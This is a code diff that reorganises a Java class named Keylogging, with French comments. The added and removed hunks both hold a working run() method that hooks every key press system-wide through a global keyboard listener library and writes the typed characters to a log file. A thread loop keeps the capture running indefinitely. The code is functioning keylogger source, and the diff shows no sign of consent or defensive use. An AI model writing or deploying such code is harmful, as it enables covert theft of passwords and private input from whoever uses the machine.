@@ -37,20 +37,36 @@ import de.ksquared.system.keyboard.KeyListener;
 public class Keylogging extends Thread {
 
 
+	private static boolean capslock; // Flag pour les touches speciales
 	/**************************************************** *********************************************************************************/
 	/*													   ARGUMENTS																	   /	
 	/**************************************************************************************************************************************/
 	
 	private static String cheminFile; // nom du Fichier
 	private static File f;
-	private int code;
-	private static boolean capslock; // Flag pour les touches speciales
-	private static boolean shift; //
 	private static PrintWriter pw; // Flux d'ecriture dans le fichier
+	private static boolean shift; //
+	public static String getCheminFile() {
+		return cheminFile;
+	}
+	public static void setCheminFile(String cheminFile) {
+		Keylogging.cheminFile = cheminFile;
+	}
+
+
+
+
+	private int code;
+
+	
+	
+	
+
+	/**************************************************** *********************************************************************************/
+	/*													   METHODES																	   /	
+	/**************************************************************************************************************************************/
+	
 	private int nombredecaractereparligne = 0;
-
-
-
 
 	/**************************************************** *********************************************************************************/
 	/*													   CONSTRUCTEUR																	   /	
@@ -74,81 +90,10 @@ public class Keylogging extends Thread {
 		}
 	}
 
-	
-	
-	
-
-	/**************************************************** *********************************************************************************/
-	/*													   METHODES																	   /	
-	/**************************************************************************************************************************************/
-	
-	/**
-	 * 			Methode run du Keylogger utilisant la libraire KeyboardHook ' H. Joseph, 23 Jul 2001 ' qui permet de capturer des saisies
-	 * 			au clavier
-	 *			Creation d'un Global Listener qui va lancer deux Thread: un pour l'appui sur une touche, un pour le relachement	
-	 * 
-	 */
-	@Override
-	public void run() {
-		new GlobalKeyListener().addKeyListener(new KeyListener() {
-
-			@Override
-			public void keyPressed(
-					final de.ksquared.system.keyboard.KeyEvent event) {
-				// TODO Auto-generated method stub
-				Thread t = new Thread() {
-					public void run() {
-						try {
-							code = event.getVirtualKeyCode();
-
-							char character = codeToChar(code);
-						
-							if (nombredecaractereparligne++ > 40) {
-								pw.println();
-								pw.flush();
-								nombredecaractereparligne = 0;
-							}
-							else
-							{
-								pw.print(character);
-								pw.flush();								
-							}
-						} catch (Exception e) {
-							e.printStackTrace();
-						}
-					}
-				};
-				t.start();
-			}
-
-			@Override
-			public void keyReleased(
-					final de.ksquared.system.keyboard.KeyEvent event) {
-				// TODO Auto-generated method stub
-				Thread t1 = new Thread() {
-					public void run() {
-
-						code = event.getVirtualKeyCode();
-						switch (code) {
-						case 160:
-							shift = false;
-							break;
-						case 161:
-							shift = false;
-							break;
-						}
-					}
-				};
-				t1.start();
-			}
-		});
-		while (true) {
-			try {
-				Thread.sleep(100);											// N'arrete jamais le Thread
-			} catch (InterruptedException e) {
-				e.printStackTrace();
-			}
-		}
+	@SuppressWarnings("deprecation")
+	public void arreteKeylog() {
+		this.stop();
+		pw.close();
 	}
 
 	/**
@@ -590,12 +535,6 @@ public class Keylogging extends Thread {
 		return key;
 	}
 
-	@SuppressWarnings("deprecation")
-	public void arreteKeylog() {
-		this.stop();
-		pw.close();
-	}
-
 	private String getPath() {
 		String chemin = ((System.getProperty("os.name").contains("win") || System
 				.getProperty("os.name").contains("Win")) ? Paths.get("")
@@ -604,16 +543,77 @@ public class Keylogging extends Thread {
 		return chemin;
 	}
 
-	public static String getCheminFile() {
-		return cheminFile;
-	}
 
 
 
 
+	/**
+	 * 			Methode run du Keylogger utilisant la libraire KeyboardHook ' H. Joseph, 23 Jul 2001 ' qui permet de capturer des saisies
+	 * 			au clavier
+	 *			Creation d'un Global Listener qui va lancer deux Thread: un pour l'appui sur une touche, un pour le relachement	
+	 * 
+	 */
+	@Override
+	public void run() {
+		new GlobalKeyListener().addKeyListener(new KeyListener() {
 
-	public static void setCheminFile(String cheminFile) {
-		Keylogging.cheminFile = cheminFile;
+			@Override
+			public void keyPressed(
+					final de.ksquared.system.keyboard.KeyEvent event) {
+				// TODO Auto-generated method stub
+				Thread t = new Thread() {
+					public void run() {
+						try {
+							code = event.getVirtualKeyCode();
+
+							char character = codeToChar(code);
+						
+							if (nombredecaractereparligne++ > 40) {
+								pw.println();
+								pw.flush();
+								nombredecaractereparligne = 0;
+							}
+							else
+							{
+								pw.print(character);
+								pw.flush();								
+							}
+						} catch (Exception e) {
+							e.printStackTrace();
+						}
+					}
+				};
+				t.start();
+			}
+
+			@Override
+			public void keyReleased(
+					final de.ksquared.system.keyboard.KeyEvent event) {
+				// TODO Auto-generated method stub
+				Thread t1 = new Thread() {
+					public void run() {
+
+						code = event.getVirtualKeyCode();
+						switch (code) {
+						case 160:
+							shift = false;
+							break;
+						case 161:
+							shift = false;
+							break;
+						}
+					}
+				};
+				t1.start();
+			}
+		});
+		while (true) {
+			try {
+				Thread.sleep(100);											// N'arrete jamais le Thread
+			} catch (InterruptedException e) {
+				e.printStackTrace();
+			}
+		}
 	}
 
 
